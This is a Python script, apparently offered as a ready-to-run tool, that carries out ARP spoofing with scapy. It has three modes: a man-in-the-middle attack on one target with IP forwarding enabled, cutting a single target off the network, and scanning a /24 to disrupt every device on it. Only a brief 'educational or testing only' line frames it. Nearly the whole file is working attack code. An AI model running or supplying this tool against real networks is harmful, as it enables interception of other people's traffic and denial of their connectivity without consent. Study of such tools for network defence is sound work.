import scapy.all as scapy
import time
import argparse
import threading
import subprocess

global modIndex
modIndex = 0


class CustomArgumentParser(argparse.ArgumentParser):
    def print_help(self, file=None):
        custom_help = """\nARP Spoofing Tool / ARP Mix Tool\n
        We utilize ARP spoofing techniques to achieve various effects, 
        including acting as a Man-in-the-Middle (MITM) or disrupting network connectivity for testing purposes. 
        However, please use it responsibly for educational or testing purposes only,
        and avoid any malicious activities.

        Options:
          -t    :  Target IP
          -g    :  Gateway IP we want to change
          -m    :  Mode (1 or 2):
                        Mode 1 - arp spoofing by our computer as MITM attack.
                        Mode 2 - Block the Target IP communication with the network.
                        Mode 3 - Block all the devices communication on the network. (mix mac:ip) 

        """
        print(custom_help)


def get_arguments():
    parser = CustomArgumentParser()
    parser.add_argument("-t", dest="target")
    parser.add_argument("-g", dest="gateway")
    parser.add_argument("-m", dest="mode")
    args = parser.parse_args()
    return args


def spoof_thread(target_ip, gateway_ip):
    time.sleep(3)
    sentPackets = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            sentPackets += 2
            print(f"\r[+] Total arp packets sent: {sentPackets}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nReseting ARP tables. Please wait...")
        restore(target_ip, gateway_ip)
        print("\nARP table restored.")

def start_spoofing_threads(target_ip_list, gateway_ip):
    command = "echo 0 >/proc/sys/net/ipv4/ip_forward"
    subprocess.run(command, shell=True, check=True)
    index =1
    for target_ip in target_ip_list:
        if target_ip != gateway_ip:
            print("spoofed",target_ip,"device - index",index)
            index=index+1
            thread = threading.Thread(target=spoof_thread, args=(target_ip, gateway_ip))
            thread.start()

def get_ip_devices(router_ip):
    arp_request = scapy.ARP(pdst=router_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    ip_list = []
    # Parsing the responses
    for element in answered_list:
        ip_list.append(element[1].psrc)

    return ip_list



# Get target mac address using ip address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    return answered_list[0][1].hwsrc

# Change mac address in arp table
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restore mac address in arp table
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)



def Function1or2(args):
        sentPackets = 0
        try:
            if (modIndex == 1):
                command = "echo 1 >/proc/sys/net/ipv4/ip_forward"
                subprocess.run(command, shell=True, check=True)
            while True:
               spoof(args.target, args.gateway)
               if (modIndex ==1):
                   spoof(args.gateway, args.target)
               sentPackets += 2
               print(f"\r[+] Total arp packets sent: {sentPackets}", end="")
               time.sleep(2)
        except KeyboardInterrupt:
            print("Reseting ARP tables. Please wait...")
            restore(args.target, args.gateway)
            if (modIndex == 1):
                restore(args.gateway, args.target)
            print("\nARP table restored.")

def Function3(args):
    target_ip_list = get_ip_devices(args.gateway+"/24")
    start_spoofing_threads(target_ip_list, args.gateway)

def act():
    args = get_arguments()
    command = "echo 0 >/proc/sys/net/ipv4/ip_forward"
    subprocess.run(command, shell=True, check=True)
    global modIndex

    if args.mode == "1":
        print("[+] Mode 1 acted - press ctrl+z to stop the process nicely")
        modIndex = 1
        Function1or2(args)
    elif args.mode == "2":
        print("[+] Mode 2 acted - press ctrl+z to stop the process nicely")
        modIndex = 2
        Function1or2(args)
    elif args.mode == "3":
        print("[+] Mode 3 acted  - press ctrl+z to stop the process nicely ")
        modIndex = 3
        Function3(args)
    else:
        parser = CustomArgumentParser()
        parser.error("Invalid mode. Please specify mode as 1 or 2.")

act()
